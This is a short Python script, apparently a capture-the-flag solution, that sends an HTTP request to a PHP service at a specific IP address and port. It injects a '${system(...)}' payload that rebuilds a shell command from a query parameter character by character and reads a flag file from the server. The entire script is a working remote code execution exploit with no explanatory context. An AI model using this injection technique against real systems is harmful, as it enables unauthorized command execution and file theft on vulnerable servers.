import requests

#cmd = "ls ../"
cmd = "cat ../flagEEgeD"
url="http://46.101.33.243:30278/?format="
url+=cmd
url+="${system("
for i in range(0,len(cmd)):
    url+="$this->format[{}]".format(i)
    if(i < len(cmd)-1): url+="."
url+=")}"
r = requests.get(url)
print(r.text[0:r.text.find("<html>")])
